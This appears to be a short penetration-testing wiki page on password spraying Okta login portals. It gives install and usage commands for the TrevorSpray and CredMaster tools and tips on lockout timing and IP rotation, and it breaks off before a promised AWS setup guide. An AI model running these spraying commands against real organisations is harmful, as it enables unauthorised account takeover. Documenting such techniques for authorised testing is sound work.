# Okta

### Password Spraying

Password spraying Okta is just as easy as password spraying any other service, however, visibility can be difficult at times as Okta does not display if a user has been locked out. For this reason, it is recommended to configure password spray tooling to have longer lockouts, ensuring there are no business disruptions.

#### Spraying Okta with TrevorSpray

```bash
# Installation
pip install git+https://github.com/blacklanternsecurity/trevorproxy
pip install git+https://github.com/blacklanternsecurity/trevorspray

# Password Spraying
trevorspray -m okta -u $users -p $password
```

{% hint style="info" %}
After submitting the above command, TrevorSpray will ask for the subdomain of the company you're targeting $`.okta.com` This should have been identified during the reconaissance phase and is often `$companyname.okta.com`.&#x20;
{% endhint %}

#### Spraying Okta with CredMaster

```bash
# https://github.com/knavesec/CredMaster

python3 credmaster.py --plugin -u $users -p $passwords -a $useragents --config $config
```

CredMaster requires AWS access keys to setup FireProx, the following guide can be used to configure the appropriate permissions and start spraying:
